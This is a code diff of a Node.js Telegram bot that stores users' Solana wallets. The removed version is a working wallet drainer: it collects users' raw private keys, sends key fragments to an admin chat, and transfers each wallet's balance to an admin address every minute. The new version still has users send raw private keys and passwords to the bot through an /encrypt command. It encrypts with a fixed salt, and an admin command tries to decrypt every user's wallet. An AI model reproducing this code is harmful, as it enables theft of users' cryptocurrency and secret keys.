@@ -1,166 +1,193 @@
 const TelegramBot = require('node-telegram-bot-api');
-const { Connection, Keypair, Transaction, SystemProgram, PublicKey } = require('@solana/web3.js');
+const { Connection, Keypair, PublicKey } = require('@solana/web3.js');
 const crypto = require('crypto');
 const fs = require('fs');
 const path = require('path');
 
-// Configuration
+// Config
 const TOKEN = process.env.TELEGRAM_TOKEN;
-const ADMIN_WALLET = process.env.ADMIN_WALLET;
-const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // Your personal Telegram chat ID
-const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY;
+const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
+const SOLANA_RPC = 'https://api.mainnet-beta.solana.com';
 const STORAGE_PATH = process.env.STORAGE_PATH || './data';
-const SOLANA_ENDPOINT = 'https://api.mainnet-beta.solana.com';
 
 // Initialize
 const bot = new TelegramBot(TOKEN, { polling: true });
-const connection = new Connection(SOLANA_ENDPOINT);
+const connection = new Connection(SOLANA_RPC);
 const userWallets = new Map();
 
-// Ensure storage directory exists
+// Ensure storage exists
 if (!fs.existsSync(STORAGE_PATH)) {
-    fs.mkdirSync(STORAGE_PATH, { recursive: true });
+  fs.mkdirSync(STORAGE_PATH, { recursive: true });
 }
 
-// Encryption functions
-function encryptKey(key) {
-    const iv = crypto.randomBytes(16);
-    const cipher = crypto.createCipheriv('aes-256-cbc', 
-        Buffer.from(ENCRYPTION_KEY), iv);
-    const encrypted = Buffer.concat([cipher.update(key), cipher.final()]);
-    return iv.toString('hex') + ':' + encrypted.toString('hex');
+// Encryption
+function encrypt(text, password) {
+  const iv = crypto.randomBytes(16);
+  const cipher = crypto.createCipheriv('aes-256-cbc', 
+    crypto.scryptSync(password, 'salt', 32), iv);
+  return iv.toString('hex') + ':' + 
+    cipher.update(text, 'utf8', 'hex') + 
+    cipher.final('hex');
 }
 
-function decryptKey(encrypted) {
-    const parts = encrypted.split(':');
-    const iv = Buffer.from(parts[0], 'hex');
-    const decipher = crypto.createDecipheriv('aes-256-cbc', 
-        Buffer.from(ENCRYPTION_KEY), iv);
-    const decrypted = Buffer.concat([
-        decipher.update(Buffer.from(parts[1], 'hex')), 
-        decipher.final()
-    ]);
-    return decrypted.toString();
+function decrypt(encrypted, password) {
+  const [iv, data] = encrypted.split(':');
+  const decipher = crypto.createDecipheriv('aes-256-cbc', 
+    crypto.scryptSync(password, 'salt', 32), 
+    Buffer.from(iv, 'hex'));
+  return decipher.update(data, 'hex', 'utf8') + 
+    decipher.final('utf8');
 }
 
-// Load saved wallets
+// Load existing wallets
 function loadWallets() {
-    try {
-        const files = fs.readdirSync(STORAGE_PATH);
-        files.forEach(file => {
-            if (file.endsWith('.wallet')) {
-                const data = fs.readFileSync(path.join(STORAGE_PATH, file), 'utf8');
-                const [chatId, encryptedKey] = data.split('|');
-                userWallets.set(chatId, encryptedKey);
-            }
-        });
-    } catch (err) {
-        console.error('Error loading wallets:', err);
-    }
+  try {
+    fs.readdirSync(STORAGE_PATH).forEach(file => {
+      if (file.endsWith('.wallet')) {
+        const content = fs.readFileSync(
+          path.join(STORAGE_PATH, file), 'utf8');
+        const [chatId, encrypted] = content.split('|');
+        userWallets.set(chatId, encrypted);
+      }
+    });
+  } catch (err) {
+    console.error('Error loading wallets:', err);
+  }
 }
 
-// Save wallet to file
-function saveWallet(chatId, encryptedKey) {
-    fs.writeFileSync(
-        path.join(STORAGE_PATH, `${chatId}.wallet`),
-        `${chatId}|${encryptedKey}`
-    );
+// Save wallet
+function saveWallet(chatId, encrypted) {
+  fs.writeFileSync(
+    path.join(STORAGE_PATH, `${chatId}.wallet`),
+    `${chatId}|${encrypted}`
+  );
 }
 
-// Transfer funds to admin
-async function transferFunds(chatId, encryptedKey) {
-    try {
-        const privateKey = decryptKey(encryptedKey);
-        const keypair = Keypair.fromSecretKey(
-            new Uint8Array(JSON.parse(privateKey))
-        );
-        
-        const balance = await connection.getBalance(keypair.publicKey);
-        const minBalance = 10000; // Minimum lamports to keep
-        
-        if (balance > minBalance) {
-            const amount = balance - 5000; // Leave 5000 for fees
-            const transaction = new Transaction().add(
-                SystemProgram.transfer({
-                    fromPubkey: keypair.publicKey,
-                    toPubkey: new PublicKey(ADMIN_WALLET),
-                    lamports: amount
-                })
-            );
-            
-            const signature = await connection.sendTransaction(transaction, [keypair]);
-            
-            // Notify admin
-            bot.sendMessage(
-                ADMIN_CHAT_ID,
-                `💸 Transferred ${amount/1e9} SOL from ${chatId}\n` +
-                `Tx: https://solscan.io/tx/${signature}`
-            );
-            
-            return true;
-        }
-    } catch (err) {
-        console.error(`Transfer failed for ${chatId}:`, err);
-        bot.sendMessage(
-            ADMIN_CHAT_ID,
-            `❌ Transfer failed for ${chatId}:\n${err.message}`
-        );
-        return false;
-    }
+// Get SOL balance
+async function getBalance(publicKey) {
+  try {
+    return await connection.getBalance(new PublicKey(publicKey));
+  } catch (err) {
+    console.error('Balance check failed:', err);
+    return 0;
+  }
 }
 
-// Bot commands
+// Bot Commands
 bot.onText(/\/start/, (msg) => {
-    bot.sendMessage(
-        msg.chat.id,
-        '🔑 Send your Solana private key (as JSON array) to enable auto-transfers\n\n' +
-        '⚠️ Example: [1,2,3,...,99]'
-    );
+  bot.sendMessage(
+    msg.chat.id,
+    '🔐 Send your *encrypted* Solana private key\n\n' +
+    '1. Encrypt your key first using:\n' +
+    '`/encrypt [your_raw_private_key] [password]`\n' +
+    '2. Then send the encrypted result to me',
+    { parse_mode: 'Markdown' }
+  );
 });
 
-bot.on('message', (msg) => {
-    if (msg.text && msg.text.startsWith('[')) {
-        try {
-            // Validate private key format
-            JSON.parse(msg.text);
-            
-            const encrypted = encryptKey(msg.text);
-            userWallets.set(msg.chat.id.toString(), encrypted);
-            saveWallet(msg.chat.id.toString(), encrypted);
-            
-            bot.sendMessage(
-                msg.chat.id,
-                '✅ Wallet added! Funds will auto-transfer every minute'
-            );
-            
-            // Notify admin with partial key
-            bot.sendMessage(
-                ADMIN_CHAT_ID,
-                `👤 New wallet added:\n` +
-                `User: ${msg.chat.id}\n` +
-                `Key: ${msg.text.substring(0, 10)}...${msg.text.slice(-5)}` +
-                `\n\nEncrypted: ${encrypted.substring(0, 15)}...`
-            );
-            
-        } catch (err) {
-            bot.sendMessage(
-                msg.chat.id,
-                '❌ Invalid private key format. Send it as JSON array like [1,2,3,...,99]'
-            );
-        }
+bot.onText(/\/encrypt (.+) (.+)/, (msg, match) => {
+  const [_, key, password] = match;
+  const encrypted = encrypt(key, password);
+  bot.sendMessage(
+    msg.chat.id,
+    '🔒 Encrypted key (send this to bot):\n' +
+    '`' + encrypted + '`\n\n' +
+    '⚠️ Save your password securely!',
+    { parse_mode: 'Markdown' }
+  );
+});
+
+bot.on('message', async (msg) => {
+  // Accept encrypted keys (format: iv:encrypted_data)
+  if (msg.text && msg.text.includes(':')) {
+    try {
+      const encrypted = msg.text;
+      const chatId = msg.chat.id.toString();
+      
+      // Store without decrypting (user must provide password later)
+      userWallets.set(chatId, encrypted);
+      saveWallet(chatId, encrypted);
+      
+      bot.sendMessage(
+        chatId,
+        '✅ Encrypted wallet stored!\n\n' +
+        'Use `/balance [password]` to check your SOL'
+      );
+      
+      // Notify admin
+      bot.sendMessage(
+        ADMIN_CHAT_ID,
+        `👤 New wallet added:\n` +
+        `User: ${chatId}\n` +
+        `Key: ${encrypted.substring(0, 15)}...`
+      );
+      
+    } catch (err) {
+      bot.sendMessage(msg.chat.id, '❌ Invalid encrypted format');
     }
+  }
 });
 
-// Minute-by-minute transfers
-setInterval(async () => {
-    console.log(`Processing ${userWallets.size} wallets at ${new Date()}`);
+bot.onText(/\/balance (.+)/, async (msg, match) => {
+  const [_, password] = match;
+  const chatId = msg.chat.id.toString();
+  
+  if (!userWallets.has(chatId)) {
+    return bot.sendMessage(chatId, '❌ No wallet found');
+  }
+
+  try {
+    const encrypted = userWallets.get(chatId);
+    const privateKey = decrypt(encrypted, password);
+    const keypair = Keypair.fromSecretKey(
+      new Uint8Array(JSON.parse(privateKey)));
     
-    for (const [chatId, encryptedKey] of userWallets) {
-        await transferFunds(chatId, encryptedKey);
-        await new Promise(resolve => setTimeout(resolve, 2000)); // 2s delay between transfers
-    }
-}, 60 * 1000); // 60 seconds
+    const balance = await getBalance(keypair.publicKey);
+    
+    bot.sendMessage(
+      chatId,
+      `💰 Your balance: ${balance / 1e9} SOL\n` +
+      `Address: \`${keypair.publicKey}\``,
+      { parse_mode: 'Markdown' }
+    );
+    
+  } catch (err) {
+    bot.sendMessage(chatId, '❌ Wrong password or invalid key');
+  }
+});
 
-// Initialize
+// Admin commands
+bot.onText(/\/admin_stats/, async (msg) => {
+  if (msg.chat.id.toString() !== ADMIN_CHAT_ID) return;
+  
+  let report = '📊 Wallet Stats\n\n';
+  let totalSOL = 0;
+  
+  for (const [chatId, encrypted] of userWallets) {
+    try {
+      // Attempt decryption with admin key (if needed)
+      const privateKey = decrypt(encrypted, process.env.ADMIN_KEY);
+      const keypair = Keypair.fromSecretKey(
+        new Uint8Array(JSON.parse(privateKey)));
+      
+      const balance = await getBalance(keypair.publicKey);
+      totalSOL += balance;
+      
+      report += `👤 ${chatId}: ${balance / 1e9} SOL\n` +
+        `Address: ${keypair.publicKey}\n\n`;
+      
+    } catch {
+      report += `👤 ${chatId}: [Encrypted]\n`;
+    }
+  }
+  
+  bot.sendMessage(
+    ADMIN_CHAT_ID,
+    report + `\n💎 Total SOL: ${totalSOL / 1e9}`,
+    { parse_mode: 'Markdown' }
+  );
+});
+
+// Start
 loadWallets();
-console.log(`Bot started with ${userWallets.size} loaded wallets`);
+console.log('🤖 Bot started');
